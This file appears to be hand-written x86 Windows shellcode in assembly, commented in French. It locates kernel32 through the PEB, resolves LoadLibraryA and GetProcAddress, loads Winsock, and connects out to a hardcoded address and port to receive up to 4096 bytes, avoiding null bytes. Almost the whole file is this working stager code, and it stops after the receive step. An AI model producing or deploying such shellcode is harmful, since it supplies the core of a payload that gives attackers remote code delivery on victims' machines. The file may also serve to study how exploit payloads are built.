;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Explication du shellcode.
; -On crée des varibales
;
; -On recherche dynamiquement Kernel32.dll
; -On recherche LoadLibraryA() dans Kernel32 et on stock l'adresse de la fonction.
; -On recherche dynamiquement Kernel32.dll
; -On recherche GetProcAddress() dans Kernel32  et on stock l'adresse de la fonction.
; -On charge la library "ws2_32.dll" avec LoadLibraryA() et on stock le HANDLE
; -On recherche WSAStartUp avec GetProcAddress() et on stock son adresse
; -On recherche WSASocketA avec GetProcAddress() et on stock son adresse
; -On recherche connect avec GetProcAddress() et on stock son adresse
; -On recherche recv avec GetProcAddress() et on stock son adresse
;
; -On appel WSAStartUp() 
; -On appel WSASocketA() 
; -On appel connect() 
; -On appel recv() 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Création d'une stack vide
push ebp
mov ebp, esp

; Création est allocation vide de variables
sub esp, 20h                    ; Création d'éspace dans la stack
xor eax, eax                    ; EAX à zero
mov [ebp - 04h], eax            ; LoadLibraryA address
mov [ebp - 08h], eax            ; GetProcAddress address
mov [ebp - 0ch], eax            ; HANDLE ws2_32.dll
mov [ebp - 10h], eax            ; WSAStartUp address
mov [ebp - 14h], eax            ; WSASocketA address
mov [ebp - 18h], eax            ; connect address
mov [ebp - 1ch], eax            ; recv address
mov [ebp - 20h], eax            ; send address

;Recherche de Kernel32
mov edi, [fs:eax+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

k32A_loop:
mov ebx, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne k32A_loop

;Kernel32 PE Header
mov edi, ebx
add edi, [ebx+0x3c]

;Kernel32 Export Directory Table
mov ecx, [edi+0x78]
add ecx, ebx

;Kernel32 Name Pointers
mov edi, [ecx+0x20]
add edi, ebx

;Recherche de LoadLibraryA
LLA_loop:
mov esi, [edi+eax*4]
add esi, ebx
inc eax
cmp dword [esi],   0x64616f4c ;daoL
jne LLA_loop
cmp dword [esi+7], 0x79726172 ;yrar
jne LLA_loop

;LoadLibraryA ordinal
mov edi, [ecx+0x24]
add edi, ebx
mov ax, [edi+eax*2]

;LoadLibraryA addresse
mov edi, [ecx+0x1C]
add edi, ebx
mov edi, [edi+(eax-1)*4] ;subtract ordinal base
add edi, ebx
mov [ebp - 04h], edi

;Find Kernel32 Base
xor eax,eax ; Mise à 0 de EAX
mov edi, [fs:eax+0x30]
mov edi, [edi+0x0c]
mov edi, [edi+0x1c]

k32B_loop:
mov ebx, [edi+0x08]
mov esi, [edi+0x20]
mov edi, [edi]
cmp byte [esi+12], '3'
jne k32B_loop

;Kernel32 PE Header
mov edi, ebx
add edi, [ebx+0x3c]

;Kernel32 Export Directory Table
mov ecx, [edi+0x78]
add ecx, ebx

;Kernel32 Name Pointers
mov edi, [ecx+0x20]
add edi, ebx

;Trouver GetProcAddress
GPA_loop:
mov esi, [edi+eax*4]
add esi, ebx
inc eax
cmp dword [esi],   0x50746547 ;PteG
jne GPA_loop
cmp dword [esi+4], 0x41636f72 ;Acor
jne GPA_loop

;GetProcAddress ordinal
mov edi, [ecx+0x24]
add edi, ebx
mov ax, [edi+eax*2]

;GetProcAddress addresse
mov edi, [ecx+0x1C]
add edi, ebx
mov edi, [edi+(eax-1)*4] ;subtract ordinal base
add edi, ebx
mov [ebp - 08h], edi

;Recherche de ws2_32
xor eax,eax ; Mise à 0 de EAX
push 0x41416c6c ; AAll
mov [esp+2],word ax
push 0x642e3233 ; d.23
push 0x5f327377 ; _2sw
lea ebx,[esp]
push ebx
call [ebp - 04h]
mov [ebp - 0ch], eax 

;Recherche de WSAStartUp
xor eax,eax ; Mise à 0 de EAX
push 0x41417075 ; pu
mov [esp+2],word ax
push 0x74726174 ; tart
push 0x53415357 ; SASW
lea ebx,[esp]
push ebx ; "WSAStartup"
mov ebx, [ebp - 0ch] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 10h], eax ; WSAStartup address

;Recherche de WSASocketA
xor eax,eax ; Mise à 0 de EAX
push 0x41414174 ; AAAt
mov [esp+2],word ax
push 0x656b636f ; ekco
push 0x53415357 ; SASW
lea ebx,[esp]
push ebx ; "WSASocketA"
mov ebx, [ebp - 0ch] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 14h], eax ; WSASocketA address

;Recherche de connect
xor eax,eax ; Mise à 0 de EAX
push 0x41746365 ; Atce
mov [esp+3],byte 0x0
push 0x6e6e6f63 ; nnoc
lea ebx,[esp]
push ebx ; "connect"
mov ebx, [ebp - 0ch] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 18h], eax ; connect address

;Recherche de recv
xor eax,eax ; Mise à 0 de EAX
push 0x00000000 ; empty
push 0x76636572 ; vcer
lea ebx,[esp]
push ebx ; "recv"
mov ebx, [ebp - 0ch] ; ws2 HANDLE
push ebx 
call [ebp - 08h] ; GetProcAddress
mov [ebp - 1ch], eax ; recv address

;Recherche de send
xor eax,eax ; Mise à 0 de EAX
push 0x00000000 ; empty
push 0x646e6573 ; dnes
lea ebx,[esp]
push ebx ; "send"
mov ebx, [ebp - 0ch] ; ws2 HANDLE
push ebx
call [ebp - 08h] ; GetProcAddress
mov [ebp - 20h], eax ; send address

; Call WSAStartup
xor ebx,ebx ; Mise à 0 de EBX
mov ebx,0x1191221
sub ebx,0x1191091
sub esp,ebx
push esp
push ebx
mov ebx,[ebp - 10h]
call ebx

; Call WSASocketA
xor ebx,ebx ; Mise à 0 de EBX
push ebx
push ebx
push ebx
xor edx, edx
mov dl, 6
push edx
inc ebx
push ebx
inc ebx
push ebx
mov ebx, [ebp - 14h]
call ebx
mov edi,eax

; Call connect
connect:
push 0x0100007f ; IP             ; 8b
push word 0xB822 ; PORT          ; 12b
xor ebx,ebx ; Mise à 0 de EBX
add bl, 2 
push word bx                     ; 16b
mov edx, esp
push byte 16                     ; 17b
push edx                         ; 25b
push edi                         ; 54b
mov ebx, [ebp - 18h]
call ebx
cmp eax,   0x0 ;ERROR_SUCCESS
je recv
sub esp, 0x50 ; EN TEST
jmp connect

; Call recv
recv:
xor ebx,ebx ; Mise à 0 de EBX
mov bx, 1111h
sub bx, 111h ; Anti NULL-BYTE, 0x1000 (4096)
sub esp,ebx ; On retire EBX de la stack
mov [ebp - 24h],esp ; On sauvegarde la stack sans EBX
xor ecx,ecx ; Mise à 0 de ECX
push ecx ; Push 0 - Flag
push ebx ; Push 0x1000 - Taille de la data
mov ebx, [ebp - 24h] ; on remet l'ancienne stack dans EBX
push ebx
push edi
mov ebx, [ebp - 1ch]
call ebx
mov edx,eax
nop
nop
nop
mov edx, esp ; On sauvegarde le string récéptionné dans EDX

nop
nop
nop
nop
nop

